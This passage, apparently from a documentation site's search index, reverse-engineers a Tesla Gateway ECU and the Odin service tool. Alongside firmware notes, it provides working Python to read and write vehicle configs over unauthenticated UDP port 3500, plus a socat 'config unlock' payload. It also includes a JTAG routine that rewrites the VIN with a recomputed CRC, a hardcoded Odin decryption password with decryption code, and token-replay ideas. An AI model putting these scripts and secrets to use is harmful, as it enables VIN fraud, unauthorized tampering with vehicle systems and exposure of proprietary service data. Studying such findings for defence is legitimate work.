Analysis","text":""},{"location":"2-gateway/firmware-analysis/#statistics","title":"Statistics","text":"Category Count Total strings 37,702 Config-related ~500 CAN message IDs ~6,600 Debug messages ~2,000 Error strings ~800"},{"location":"2-gateway/firmware-analysis/#notable-patterns","title":"Notable Patterns","text":"<pre><code>get_config_%04X    - Config read functions\nset_config_%04X    - Config write functions\nCAN_MSG_0x%03X     - CAN message handlers\nERR_%s             - Error conditions\n</code></pre>"},{"location":"2-gateway/firmware-analysis/#example-strings","title":"Example Strings","text":"<pre><code>\"Gateway firmware version %s\"\n\"Config ID 0x%04X not found\"\n\"CRC validation failed\"\n\"Authentication required\"\n\"Factory mode: %s\"\n</code></pre>"},{"location":"2-gateway/firmware-analysis/#function-table","title":"Function Table","text":""},{"location":"2-gateway/firmware-analysis/#identified-functions","title":"Identified Functions","text":"Address Function (Inferred) 0x00950 Entry dispatch 0x01000 Main initialization 0x01044 Factory gate check 0x02000 CAN handler dispatch 0x10000 Config read handler 0x10500 Config write handler 0x20000 UDP service loop <p>Note: Binary is stripped, function names are inferred from behavior.</p>"},{"location":"2-gateway/firmware-analysis/#can-message-handlers","title":"CAN Message Handlers","text":""},{"location":"2-gateway/firmware-analysis/#handler-table-location","title":"Handler Table Location","text":"<p>Found at offset 0x403000, containing 6,647 entries.</p>"},{"location":"2-gateway/firmware-analysis/#entry-format","title":"Entry Format","text":"<pre><code>Offset   Size    Field\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n+0x00    2       CAN ID (big-endian)\n+0x02    1       Data length\n+0x03    1       Handler type\n+0x04    4       Handler address\n</code></pre>"},{"location":"2-gateway/firmware-analysis/#message-types","title":"Message Types","text":"Type Description 0x01 Periodic status 0x02 Request/response 0x03 Event notification 0x04 Diagnostic (UDS)"},{"location":"2-gateway/firmware-analysis/#udp-handler","title":"UDP Handler","text":""},{"location":"2-gateway/firmware-analysis/#port-3500-service","title":"Port 3500 Service","text":"<p>Status: Handler not fully located in disassembly.</p> <p>Evidence found: - String references to port 3500 - UDP socket creation calls - Config read/write dispatch</p> <p>Challenge: Binary is stripped, RTOS task structure makes tracing difficult.</p>"},{"location":"2-gateway/firmware-analysis/#security-functions","title":"Security Functions","text":""},{"location":"2-gateway/firmware-analysis/#signature-verification","title":"Signature Verification","text":"Address Function 0x30000 Ed25519 verify (estimated) 0x30800 SHA-256 hash"},{"location":"2-gateway/firmware-analysis/#config-validation","title":"Config Validation","text":"Address Function 0x10500 CRC-8 check 0x10600 Access level check 0x10700 Hermes auth verify"},{"location":"2-gateway/firmware-analysis/#disassembly-tools","title":"Disassembly Tools","text":""},{"location":"2-gateway/firmware-analysis/#ghidra-setup","title":"Ghidra Setup","text":"<pre><code>Processor: PowerPC VLE\nBase Address: 0x00000000\nEntry Point: 0x00001000 (or 0x00000000)\nEndianness: Big-endian\n</code></pre>"},{"location":"2-gateway/firmware-analysis/#powerpc-vle-notes","title":"PowerPC VLE Notes","text":"<ul> <li>Variable Length Encoding (16-bit and 32-bit instructions)</li> <li>Non-standard opcode encoding</li> <li>Requires VLE-specific Ghidra processor</li> <li>Some instructions only 16 bits</li> </ul>"},{"location":"2-gateway/firmware-analysis/#data-files","title":"Data Files","text":"File Description <code>data/gateway/strings.csv</code> All 37,702 strings <code>data/gateway/gateway_configs_parsed.txt</code> 662 parsed configs <code>data/gateway/can-message-database-VERIFIED.csv</code> CAN entries"},{"location":"2-gateway/firmware-analysis/#research-recommendations","title":"Research Recommendations","text":""},{"location":"2-gateway/firmware-analysis/#completed","title":"Completed","text":"<ul> <li>\u2705 String extraction</li> <li>\u2705 Config region identification</li> <li>\u2705 CAN handler table location</li> <li>\u2705 CRC-8 algorithm reverse engineering</li> </ul>"},{"location":"2-gateway/firmware-analysis/#remaining","title":"Remaining","text":"<ul> <li>\u274c Complete UDP handler disassembly</li> <li>\u274c Hermes authentication flow</li> <li>\u274c Full function naming</li> <li>\u274c Bootloader analysis</li> </ul>"},{"location":"2-gateway/firmware-analysis/#cross-references","title":"Cross-References","text":"<ul> <li>Architecture - Memory map, hardware</li> <li>Config System - 662 configs</li> <li>UDP Protocol - Port 3500 API</li> </ul> <p>Status: PARTIAL Evidence: Ghidra analysis, string extraction Last Updated: 2026-02-07</p>"},{"location":"2-gateway/security-model/","title":"Gateway Security Model","text":"<p>Two-tier configuration security: UDP (insecure) vs Hermes (secure).</p>"},{"location":"2-gateway/security-model/#executive-summary","title":"Executive Summary","text":"<p>The Gateway implements a two-tier security model for configuration access:</p> Tier Access Method Authentication Examples Insecure UDP port 3500 None required Map region, units Secure Hermes + gw-diag Token + signature VIN, country, supercharger <p>Source: Confirmed by Tesla internal source and Odin database analysis.</p>"},{"location":"2-gateway/security-model/#tier-1-insecure-configs-udp","title":"Tier 1: Insecure Configs (UDP)","text":""},{"location":"2-gateway/security-model/#access-method","title":"Access Method","text":"<ul> <li>Port: UDP 3500</li> <li>Authentication: None required</li> <li>Tool: <code>gateway_database_query.py</code> or any UDP client</li> </ul>"},{"location":"2-gateway/security-model/#insecure-configs-identified","title":"Insecure Configs Identified","text":"Config Access ID Description Risk <code>ecuMapVersion</code> 33 ECU configuration version Low <code>autopilotTrialExpireTime</code> 54 AP trial expiration Medium <code>bmpWatchdogDisabled</code> 61 Battery Management watchdog Medium <code>mapRegion</code> 66 Navigation map region Low Display units Various mi/km, \u00b0F/\u00b0C None Debug flags Various Debug UART, etc. Low"},{"location":"2-gateway/security-model/#evidence","title":"Evidence","text":"<p>From Odin routines database: <pre><code>{\n  \"accessId\": 33,\n  \"accessLevel\": \"UDP\",  // \u2190 INSECURE FLAG\n  \"codeKey\": \"ecuMapVersion\"\n}\n</code></pre></p> <p>Configs with <code>accessLevel: \"UDP\"</code> can be modified without authentication.</p>"},{"location":"2-gateway/security-model/#exploitation","title":"Exploitation","text":"<pre><code># Change map region to EU\npython3 scripts/gateway_database_query.py write 0x0014 0x01\n\n# No authentication required!\n</code></pre>"},{"location":"2-gateway/security-model/#tier-2-secure-configs-hermes","title":"Tier 2: Secure Configs (Hermes)","text":""},{"location":"2-gateway/security-model/#access-method_1","title":"Access Method","text":"<ul> <li>Tool: gw-diag (Tesla service tool)</li> <li>Authentication: Hermes mTLS session + token + signature</li> <li>Method: \"Extra params or extra hex\" in gw-diag commands</li> </ul>"},{"location":"2-gateway/security-model/#secure-configs-identified","title":"Secure Configs Identified","text":"Config Description Why Secure VIN (0x0000) Vehicle identity Fraud prevention Country (0x0006) Regulatory code Homologation Supercharger access Payment authorization Revenue protection Firmware hashes Integrity verification Anti-tamper Hardware part numbers Component identity Cloning prevention"},{"location":"2-gateway/security-model/#evidence_1","title":"Evidence","text":"<p>Configs WITHOUT <code>accessLevel: \"UDP\"</code> that control paid features or identity are secure.</p> <pre><code>{\n  \"accessId\": 30,\n  \"codeKey\": \"superchargingAccess\",\n  // NO accessLevel: \"UDP\" \u2192 SECURE\n}\n</code></pre>"},{"location":"2-gateway/security-model/#tier-3-hardware-locked-gtw","title":"Tier 3: Hardware-Locked (GTW)","text":""},{"location":"2-gateway/security-model/#access-method_2","title":"Access Method","text":"<ul> <li>Cannot be changed via any software interface</li> <li>Controlled by hardware fuses</li> </ul>"},{"location":"2-gateway/security-model/#gtw-locked-configs","title":"GTW-Locked Configs","text":"Config Description <code>devSecurityLevel</code> (ID 15) Debug security level <pre><code>{\n  \"accessId\": 15,\n  \"accessLevel\": \"GTW\",  // \u2190 HARDWARE LOCKED\n  \"codeKey\": \"devSecurityLevel\",\n  \"content\": {\n    \"enums\": [\n      {\"codeKey\": \"LC_FACTORY\", \"value\": 3, \"description\": \"Factory security - CUST_DEL\"},\n      {\"codeKey\": \"LC_GATED\", \"value\": 2, \"description\": \"Post-gate - OEM_PROD\"}\n    ]\n  }\n}\n</code></pre> <p>Interpretation: This config controls the MPC5748G hardware security fuses. Cannot be changed after production.</p>"},{"location":"2-gateway/security-model/#authentication-flow","title":"Authentication Flow","text":""},{"location":"2-gateway/security-model/#secure-config-write","title":"Secure Config Write","text":"<pre><code>Tesla Toolbox \u2192 Hermes VPN (WSS:443) \u2192 MCU \u2192 gw-diag \u2192 Gateway\n\n1. Tesla technician authenticates to Toolbox\n2. Toolbox establishes Hermes session (mTLS)\n3. Runs gw-diag with auth parameters:\n\n   gw-diag write 0x0000 \\\n     --auth-token &lt;hermes_token&gt; \\\n     --signature &lt;ed25519_sig&gt; \\\n     --value \"5YJSA1E26HF000001\"\n\n4. Gateway validates:\n   - Token from authenticated session\n   - Signature covers [config_id][value][timestamp]\n   - Signed by Tesla service key\n\n5. If valid \u2192 write to flash\n   If invalid \u2192 reject with error\n</code></pre>"},{"location":"2-gateway/security-model/#signature-format-hypothesized","title":"Signature Format (Hypothesized)","text":"<pre><code>Message: [config_id:2][new_value:N][timestamp:8][reason:4]\nKey: Tesla service Ed25519 private key\nSignature: 64 bytes\n</code></pre>"},{"location":"2-gateway/security-model/#security-boundary","title":"Security Boundary","text":""},{"location":"2-gateway/security-model/#what-attackers-can-access","title":"What Attackers Can Access","text":"Access Level Capabilities Network only (UDP:3500) Read all configs, write insecure only With JTAG hardware Full flash access, bypass all software security With Hermes MITM Token replay possible, signature forgery unlikely"},{"location":"2-gateway/security-model/#attack-surface-summary","title":"Attack Surface Summary","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    GATEWAY SECURITY                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  UDP:3500 (INSECURE)          HERMES (SECURE)          \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500        \u2502\n\u2502  \u2022 No authentication          \u2022 mTLS required          \u2502\n\u2502  \u2022 Any network device         \u2022 Token validation       \u2502\n\u2502  \u2022 Map region, units          \u2022 Signature verify       \u2502\n\u2502  \u2022 Debug flags                \u2022 VIN, country           \u2502\n\u2502                               \u2022 Supercharger           \u2502\n\u2502                               \u2022 Paid features          \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502\n\u2502  \u2502  JTAG (PHYSICAL)                                \u2502   \u2502\n\u2502  \u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502   \u2502\n\u2502  \u2502  \u2022 Bypasses ALL software security               \u2502   \u2502\n\u2502  \u2502  \u2022 Direct flash read/write                      \u2502   \u2502\n\u2502  \u2502  \u2022 Can modify ANY config including VIN          \u2502   \u2502\n\u2502  \u2502  \u2022 Blocked by fuses on production vehicles      \u2502   \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"2-gateway/security-model/#bypass-methods","title":"Bypass Methods","text":""},{"location":"2-gateway/security-model/#method-1-jtag-flash-modification-verified","title":"Method 1: JTAG Flash Modification \u2705 VERIFIED","text":"<p>Requires: Hardware access, JTAG adapter, unfused chip or glitch</p> <pre><code># Direct flash modification\nflash = read_jtag_flash(0x19000, 0x10000)\n\n# Modify VIN at config 0x0000\nnew_vin = b\"5YJSA1E26HF000001\"\nnew_crc = calculate_crc8(0x0000, new_vin)\nentry = bytes([new_crc, len(new_vin) + 2]) + b'\\x00\\x00' + new_vin\n\nwrite_jtag_flash(0x19000, entry)\n# VIN changed, all software security bypassed\n</code></pre> <p>Status: Working on unfused vehicles or after voltage glitching.</p>"},{"location":"2-gateway/security-model/#method-2-hermes-token-replay-theoretical","title":"Method 2: Hermes Token Replay \u26a0\ufe0f THEORETICAL","text":"<pre><code>1. MITM Hermes connection\n2. Capture gw-diag command with auth token\n3. Replay token to modify different config\n\nRisk: Tokens likely time-limited and vehicle-specific\n</code></pre> <p>Status: Untested, requires Hermes session capture.</p>"},{"location":"2-gateway/security-model/#method-3-signature-forgery-impractical","title":"Method 3: Signature Forgery \u274c IMPRACTICAL","text":"<pre><code>Requires Tesla's Ed25519 private key\nKey size: 256 bits\nBrute force: Infeasible\n</code></pre> <p>Status: Not practical without key compromise.</p>"},{"location":"2-gateway/security-model/#testing-config-security","title":"Testing Config Security","text":""},{"location":"2-gateway/security-model/#identify-secure-vs-insecure","title":"Identify Secure vs Insecure","text":"<pre><code>def test_config_security(config_id: int, test_value: bytes):\n    \"\"\"Try to write via UDP; secure configs will fail.\"\"\"\n    result = gateway_write_config(config_id, test_value)\n\n    if result == ERROR_PERMISSION_DENIED:\n        return \"SECURE\"\n    elif result == SUCCESS:\n        return \"INSECURE\"\n    else:\n        return f\"UNKNOWN: {result}\"\n</code></pre>"},{"location":"2-gateway/security-model/#known-security-status","title":"Known Security Status","text":"Config ID Name UDP Write Status 0x0000 VIN \u274c REJECTED Secure 0x0006 Country \u274c REJECTED Secure 0x0014 mapRegion \u2705 ACCEPTED Insecure 0x0020 ecuMapVersion \u2705 ACCEPTED Insecure"},{"location":"2-gateway/security-model/#defense-layers","title":"Defense Layers","text":"<p>Tesla's security architecture:</p> Layer Protection Bypass Method 1. Network UDP rejects secure config writes N/A 2. Authentication Hermes token required Token replay? 3. Signature Ed25519 validation Key compromise 4. Audit All changes logged to Tesla N/A (detection only) 5. Hardware JTAG fuses on production Voltage glitching 6. Detection Firmware hash monitoring Flash modification <p>Weak Point: JTAG access bypasses layers 1-4.</p>"},{"location":"2-gateway/security-model/#recommendations","title":"Recommendations","text":""},{"location":"2-gateway/security-model/#for-researchers","title":"For Researchers","text":"<ol> <li>Test each config ID via UDP to map secure boundary</li> <li>Capture gw-diag commands during Tesla service</li> <li>Analyze Hermes protocol for token validation</li> <li>Document all access levels from Odin database</li> </ol>"},{"location":"2-gateway/security-model/#for-security-assessment","title":"For Security Assessment","text":"<ol> <li>Physical security critical - JTAG is the main bypass</li> <li>Network segmentation matters - UDP:3500 access allows insecure config modification</li> <li>Token security unknown - Need to test replay attacks</li> <li>Audit logging exists - Changes may be detected</li> </ol>"},{"location":"2-gateway/security-model/#cross-references","title":"Cross-References","text":"<ul> <li>Config System - All 662 configs</li> <li>UDP Protocol - Packet format</li> <li>Odin Routines Database - Access levels</li> <li>VIN Write Attack - JTAG bypass</li> </ul> <p>Status: VERIFIED \u2705 Evidence: Tesla internal source, Odin database with accessLevel flags Last Updated: 2026-02-07</p>"},{"location":"2-gateway/udp-protocol/","title":"Gateway UDP Protocol","text":"<p>Protocol specification for Gateway configuration API on UDP port 3500.</p>"},{"location":"2-gateway/udp-protocol/#overview","title":"Overview","text":"<p>The Gateway exposes a UDP API on port 3500 for reading and writing configuration values. This protocol is used by Tesla service tools and can be accessed by any device on the vehicle's internal network.</p> Parameter Value Port 3500 (UDP) Gateway IP 192.168.90.102 Access Insecure configs only (no authentication)"},{"location":"2-gateway/udp-protocol/#message-format","title":"Message Format","text":""},{"location":"2-gateway/udp-protocol/#general-structure","title":"General Structure","text":"<pre><code>Offset  Size    Field       Description\n+0x00   2       Length      Total message length (little-endian)\n+0x02   1       Command     Command byte (READ=0x01, WRITE=0x02)\n+0x03   2       Config ID   Configuration ID (big-endian)\n+0x05   N       Data        Variable-length data (for writes)\n</code></pre>"},{"location":"2-gateway/udp-protocol/#read-request","title":"Read Request","text":"<pre><code>Length: 3 bytes (fixed)\nFormat: [0x03, 0x00] [0x01] [ID_HI, ID_LO]\n\nExample - Read VIN (0x0000):\n03 00 01 00 00\n\u2502  \u2502  \u2502  \u2514\u2500\u2500\u2534\u2500\u2500 Config ID 0x0000 (BE)\n\u2502  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Command: READ (0x01)\n\u2514\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Length: 3 (LE)\n</code></pre>"},{"location":"2-gateway/udp-protocol/#read-response","title":"Read Response","text":"<pre><code>Format: [Length:2] [Status:1] [Data:N]\n\nExample - VIN response:\n14 00 00 37 53 41 59 47 44 45 45 58 50 41 30 35 32 34 36 36\n\u2502  \u2502  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502  \u2502  \u2502  ASCII: \"7SAYGDEEXPA052466\" (17 bytes)\n\u2502  \u2502  \u2514\u2500\u2500 Status: 0x00 (success)\n\u2514\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500 Length: 20 (LE)\n</code></pre>"},{"location":"2-gateway/udp-protocol/#write-request","title":"Write Request","text":"<pre><code>Length: 3 + data_length bytes\nFormat: [Length:2] [0x02] [ID:2] [CRC:1] [Data:N]\n\nExample - Write map region to EU (0x0014 = 0x01):\n06 00 02 00 14 XX 01\n\u2502  \u2502  \u2502  \u2514\u2500\u2500\u2534\u2500\u2500 Config ID 0x0014 (BE)\n\u2502  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Command: WRITE (0x02)\n\u2514\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Length: 6 (LE)\n         XX = CRC-8 of [0x0014] + [0x01]\n</code></pre>"},{"location":"2-gateway/udp-protocol/#write-response","title":"Write Response","text":"<pre><code>Format: [Length:2] [Status:1]\n\nSuccess: 03 00 00\nError:   03 00 XX (XX = error code)\n</code></pre>"},{"location":"2-gateway/udp-protocol/#commands","title":"Commands","text":""},{"location":"2-gateway/udp-protocol/#command-bytes","title":"Command Bytes","text":"Command Value Description READ 0x01 Read configuration value WRITE 0x02 Write configuration value ENUMERATE 0x03 List configs (hypothetical)"},{"location":"2-gateway/udp-protocol/#status-codes","title":"Status Codes","text":"Status Value Description SUCCESS 0x00 Operation completed INVALID_ID 0x01 Config ID not found PERMISSION_DENIED 0x02 Secure config, auth required CRC_ERROR 0x03 Invalid CRC checksum INVALID_LENGTH 0x04 Data length mismatch"},{"location":"2-gateway/udp-protocol/#python-implementation","title":"Python Implementation","text":""},{"location":"2-gateway/udp-protocol/#read-config","title":"Read Config","text":"<pre><code>import socket\nimport struct\n\nGATEWAY_IP = \"192.168.90.102\"\nGATEWAY_PORT = 3500\n\ndef read_config(config_id: int) -&gt; bytes:\n    \"\"\"Read a configuration value from Gateway.\"\"\"\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(2.0)\n\n    # Build read packet\n    packet = struct.pack('&lt;H', 3)  # Length = 3\n    packet += bytes([0x01])        # Command = READ\n    packet += struct.pack('&gt;H', config_id)  # Config ID (BE)\n\n    sock.sendto(packet, (GATEWAY_IP, GATEWAY_PORT))\n    response, _ = sock.recvfrom(1024)\n\n    # Parse response\n    length = struct.unpack('&lt;H', response[:2])[0]\n    status = response[2]\n    data = response[3:] if len(response) &gt; 3 else b''\n\n    if status != 0x00:\n        raise Exception(f\"Read failed with status {status:#x}\")\n\n    return data\n</code></pre>"},{"location":"2-gateway/udp-protocol/#write-config-insecure-only","title":"Write Config (Insecure Only)","text":"<pre><code>def calculate_crc8(config_id: int, data: bytes) -&gt; int:\n    \"\"\"Calculate CRC-8 with polynomial 0x2F.\"\"\"\n    POLY = 0x2F\n    crc = 0x00\n\n    # Process config ID (big-endian)\n    for byte in config_id.to_bytes(2, 'big'):\n        crc ^= byte\n        for _ in range(8):\n            if crc &amp; 0x80:\n                crc = ((crc &lt;&lt; 1) ^ POLY) &amp; 0xFF\n            else:\n                crc = (crc &lt;&lt; 1) &amp; 0xFF\n\n    # Process data\n    for byte in data:\n        crc ^= byte\n        for _ in range(8):\n            if crc &amp; 0x80:\n                crc = ((crc &lt;&lt; 1) ^ POLY) &amp; 0xFF\n            else:\n                crc = (crc &lt;&lt; 1) &amp; 0xFF\n\n    return crc\n\ndef write_config(config_id: int, data: bytes) -&gt; bool:\n    \"\"\"Write a configuration value to Gateway (insecure configs only).\"\"\"\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(2.0)\n\n    crc = calculate_crc8(config_id, data)\n\n    # Build write packet\n    length = 3 + 1 + len(data)  # cmd + id + crc + data\n    packet = struct.pack('&lt;H', length)  # Length\n    packet += bytes([0x02])             # Command = WRITE\n    packet += struct.pack('&gt;H', config_id)  # Config ID (BE)\n    packet += bytes([crc])              # CRC-8\n    packet += data                      # Data\n\n    sock.sendto(packet, (GATEWAY_IP, GATEWAY_PORT))\n    response, _ = sock.recvfrom(1024)\n\n    status = response[2] if len(response) &gt; 2 else 0xFF\n    return status == 0x00\n</code></pre>"},{"location":"2-gateway/udp-protocol/#config-unlock-magic-bytes","title":"Config Unlock (Magic Bytes)","text":"<p>Some sources indicate a \"config unlock\" command exists:</p>"},{"location":"2-gateway/udp-protocol/#unlock-command","title":"Unlock Command","text":"<pre><code>Hex: 18 BA BB A0 AD\n</code></pre>"},{"location":"2-gateway/udp-protocol/#usage","title":"Usage","text":"<pre><code>echo \"18babba0ad\" | xxd -r -p | socat - udp:192.168.90.102:3500\n</code></pre> <p>Expected Response: Echo of sent payload indicates success.</p> <p>Note: This may be required before writing certain configs. Status: \u26a0\ufe0f UNVERIFIED</p>"},{"location":"2-gateway/udp-protocol/#common-operations","title":"Common Operations","text":""},{"location":"2-gateway/udp-protocol/#read-vin","title":"Read VIN","text":"<pre><code>vin = read_config(0x0000)\nprint(f\"VIN: {vin.decode('ascii')}\")\n# Output: VIN: 7SAYGDEEXPA052466\n</code></pre>"},{"location":"2-gateway/udp-protocol/#read-map-region","title":"Read Map Region","text":"<pre><code>region = read_config(0x0014)\nprint(f\"Region: {region[0]}\")\n# 0 = US, 1 = EU, 3 = CN, etc.\n</code></pre>"},{"location":"2-gateway/udp-protocol/#change-map-region","title":"Change Map Region","text":"<pre><code># Set to EU (requires insecure config access)\nsuccess = write_config(0x0014, bytes([0x01]))\nprint(f\"Write success: {success}\")\n</code></pre>"},{"location":"2-gateway/udp-protocol/#read-firmware-hash","title":"Read Firmware Hash","text":"<pre><code>hash1 = read_config(0x0025)\nprint(f\"Hash 1: {hash1.hex()}\")\n</code></pre>"},{"location":"2-gateway/udp-protocol/#using-gateway_database_querypy","title":"Using gateway_database_query.py","text":""},{"location":"2-gateway/udp-protocol/#read-command","title":"Read Command","text":"<pre><code>python3 scripts/gateway_database_query.py read 0x0000\n# Output: 7SAYGDEEXPA052466\n</code></pre>"},{"location":"2-gateway/udp-protocol/#write-command","title":"Write Command","text":"<pre><code>python3 scripts/gateway_database_query.py write 0x0014 01\n# Sets map region to EU\n</code></pre>"},{"location":"2-gateway/udp-protocol/#scan-range","title":"Scan Range","text":"<pre><code>python3 scripts/gateway_database_query.py scan 0x0000 0x00A1\n# Reads all configs in range\n</code></pre>"},{"location":"2-gateway/udp-protocol/#security-considerations","title":"Security Considerations","text":""},{"location":"2-gateway/udp-protocol/#accessible-without-authentication","title":"Accessible Without Authentication","text":"<ul> <li>Any device on 192.168.90.0/24 can read ALL configs</li> <li>Any device can write INSECURE configs (map region, units, etc.)</li> <li>No encryption, no authentication on UDP protocol</li> </ul>"},{"location":"2-gateway/udp-protocol/#protected-against","title":"Protected Against","text":"<ul> <li>Writing SECURE configs (VIN, country, supercharger) - returns PERMISSION_DENIED</li> <li>Invalid CRC values - returns CRC_ERROR</li> </ul>"},{"location":"2-gateway/udp-protocol/#attack-surface","title":"Attack Surface","text":"<pre><code>Modem (192.168.90.60) \u2192 Can read/write insecure Gateway configs\nTuner (192.168.90.30) \u2192 Can read/write insecure Gateway configs\nAny compromised device \u2192 Full insecure config access\n</code></pre>"},{"location":"2-gateway/udp-protocol/#wireshark-filter","title":"Wireshark Filter","text":"<pre><code>udp.port == 3500 &amp;&amp; ip.addr == 192.168.90.102\n</code></pre>"},{"location":"2-gateway/udp-protocol/#cross-references","title":"Cross-References","text":"<ul> <li>Config System - Config ID reference</li> <li>Security Model - Secure vs insecure configs</li> <li>CAN Flood Attack - Alternative access via port 25956</li> </ul> <p>Status: VERIFIED \u2705 Evidence: Protocol analysis, working scripts Last Updated: 2026-02-07</p>"},{"location":"3-odin/","title":"Odin Diagnostic System","text":"<p>Reverse engineering of Tesla's Odin service tool.</p>"},{"location":"3-odin/#overview","title":"Overview","text":"<p>Odin is Tesla's internal diagnostic and service tool. This research documents:</p> <ul> <li>Config Hashing: SHA256 algorithm for obfuscating config names</li> <li>ODJ Encryption: Fernet encryption for diagnostic job files</li> <li>Routines Database: 2,988 Python scripts with access levels</li> <li>Decompiled Source: Python 3.6 bytecode extraction</li> </ul>"},{"location":"3-odin/#documentation","title":"Documentation","text":"Document Description architecture.md How Odin works, component overview config-decoder.md SHA256 hashing algorithm (COMPLETE) odj-encryption.md Fernet decryption methodology routines-database.md Access levels, secure config flags"},{"location":"3-odin/#quick-facts","title":"Quick Facts","text":"Metric Value Python Scripts 2,988 files Config Hashing SHA256 ODJ Encryption Fernet (PBKDF2-HMAC-SHA256) Decryption Password <code>cmftubxi7wlvmh1wmbzz00vf1ziqezf6</code> PBKDF2 Iterations 123456 Decoded Configs 62-64 (varies by model)"},{"location":"3-odin/#key-findings","title":"Key Findings","text":""},{"location":"3-odin/#1-config-hashing-algorithm-complete","title":"1. Config Hashing Algorithm \u2705 COMPLETE","text":"<pre><code># Key hash\nkey_hash = SHA256(key + salt)\n\n# Value hash (note: value comes FIRST)\nvalue_hash = SHA256(value + key + salt)\n</code></pre> <ul> <li>Salt varies per firmware version</li> <li>Algorithm decompiled from <code>gen3/config_options.py</code></li> <li>All public configs (62-64) successfully decoded</li> </ul>"},{"location":"3-odin/#2-odj-file-encryption-cracked","title":"2. ODJ File Encryption \u2705 CRACKED","text":"<pre><code>from cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\n\npassword = b\"cmftubxi7wlvmh1wmbzz00vf1ziqezf6\"\nsalt = file_contents[:16]  # First 16 bytes\niterations = 123456\n\nkdf = PBKDF2HMAC(\n    algorithm=hashes.SHA256(),\n    length=32,\n    salt=salt,\n    iterations=iterations\n)\nkey = base64.urlsafe_b64encode(kdf.derive(password))\nfernet = Fernet(key)\ndecrypted = fernet.decrypt(file_contents[16:])\n</code></pre>"},{"location":"3-odin/#3-access-level-flags-documented","title":"3. Access Level Flags \u2705 DOCUMENTED","text":"Flag Meaning Example <code>accessLevel: \"UDP\"</code> Insecure, no auth ecuMapVersion <code>accessLevel: \"GTW\"</code> Hardware locked devSecurityLevel No flag + paid feature Secure, Hermes auth superchargingAccess"},{"location":"3-odin/#tools","title":"Tools","text":"Tool Purpose decode_gateway_config.py Decode hashed config names decrypt_odj.py Decrypt Odin job files"},{"location":"3-odin/#file-locations","title":"File Locations","text":"Path Description <code>/opt/odin/</code> Odin installation directory 